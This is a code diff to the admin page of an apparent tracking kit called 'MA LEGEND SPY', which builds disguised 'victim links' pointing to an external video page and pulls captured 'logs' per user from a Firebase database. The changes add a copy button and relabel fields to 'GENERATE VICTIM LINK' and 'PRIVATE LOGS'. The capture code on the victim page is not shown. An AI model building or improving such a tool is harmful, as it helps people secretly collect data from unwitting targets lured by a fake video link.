@@ -12,12 +12,17 @@
         h2 { font-family: 'Orbitron'; color: #00a884; text-align: center; letter-spacing: 2px; font-size: 1.2rem; }
         label { font-size: 0.7rem; font-weight: bold; margin-left: 10px; }
         input { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: inset 6px 6px 12px #cbcbe1, inset -6px -6px 12px #ffffff; outline: none; margin: 10px 0; box-sizing: border-box; font-family: 'Poppins'; }
+        
+        /* Buttons Style */
         .btn { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; color: #00a884; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; margin-top: 10px; transition: 0.3s; }
         .btn:active { box-shadow: inset 4px 4px 8px #bcbfc5, inset -4px -4px 8px #ffffff; }
+        .btn-copy { background: #00a884; color: white; margin-top: 5px; font-size: 0.8rem; }
+        
         .log-card { background: #e0e5ec; padding: 20px; border-radius: 20px; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; margin-top: 20px; font-size: 0.75rem; border-left: 6px solid #00a884; animation: fadeIn 0.5s ease; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .row { display: flex; justify-content: space-between; border-bottom: 1px solid rgba(0,0,0,0.05); padding: 5px 0; }
         .row b { color: #00a884; }
+        #copy-msg { font-size: 0.6rem; color: #00a884; text-align: center; display: none; margin-top: 5px; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -26,22 +31,24 @@
             <h2>MA LEGEND SPY</h2>
             <p style="text-align:center; font-size:10px; opacity:0.6;">MULTI-USER PRIVACY ENABLED</p>
             
-            <label>YOUR SECRET KEY:</label>
-            <input type="text" id="user-key" placeholder="Enter any name/key...">
+            <label>YOUR SECRET KEY (User ID):</label>
+            <input type="text" id="user-key" placeholder="Enter your unique name/ID...">
             
             <label>TARGET VIDEO LINK:</label>
             <input type="text" id="vid-url" placeholder="YouTube, FB, or any video link...">
             
-            <button class="btn" onclick="generateLink()">GENERATE LINK</button>
+            <button class="btn" onclick="generateLink()">GENERATE VICTIM LINK</button>
             
             <div id="result-box" style="display:none; margin-top:20px;">
-                <label>SEND THIS TO VICTIM:</label>
-                <input type="text" id="final-link" readonly onclick="this.select()">
+                <label>VICTIM LINK:</label>
+                <input type="text" id="final-link" readonly>
+                <button class="btn btn-copy" onclick="copyToClipboard()">COPY LINK</button>
+                <p id="copy-msg">LENGEND! LINK COPIED TO CLIPBOARD</p>
             </div>
         </div>
 
         <div class="neu-card">
-            <button class="btn" onclick="fetchLogs()" style="color: #44476a;">REFRESH MY LOGS</button>
+            <button class="btn" onclick="fetchLogs()" style="color: #44476a;">REFRESH MY PRIVATE LOGS</button>
             <div id="logs-container"></div>
         </div>
     </div>
@@ -50,6 +57,8 @@
 
     <script>
         const FB_URL = "https://legend-tricker-default-rtdb.asia-southeast1.firebasedatabase.app/users/";
+        const VICTIM_PAGE = "https://video-obtg.vercel.app/"; 
+
         let lastCount = 0;
 
         function generateLink() {
@@ -57,10 +66,21 @@
             const vid = document.getElementById('vid-url').value.trim();
             if(!key || !vid) return alert("Please fill both fields!");
 
-            const baseUrl = window.location.href.replace('admin.html', 'index.html');
             const encoded = btoa(key + "|" + vid);
-            document.getElementById('final-link').value = baseUrl + "?id=" + encoded;
+            document.getElementById('final-link').value = VICTIM_PAGE + "?id=" + encoded;
             document.getElementById('result-box').style.display = 'block';
+            document.getElementById('copy-msg').style.display = 'none';
+        }
+
+        function copyToClipboard() {
+            const copyText = document.getElementById("final-link");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999); // Mobile ke liye
+            navigator.clipboard.writeText(copyText.value);
+            
+            const msg = document.getElementById("copy-msg");
+            msg.style.display = "block";
+            setTimeout(() => { msg.style.display = "none"; }, 2000);
         }
 
         async function fetchLogs() {
@@ -73,7 +93,7 @@
                 const container = document.getElementById('logs-container');
                 container.innerHTML = "";
 
-                if(!data) { container.innerHTML = "<p style='text-align:center; margin-top:10px;'>No logs yet.</p>"; return; }
+                if(!data) { container.innerHTML = "<p style='text-align:center;'>No logs found for this Key.</p>"; return; }
 
                 if(Object.keys(data).length > lastCount && lastCount !== 0) document.getElementById('ping').play();
                 lastCount = Object.keys(data).length;
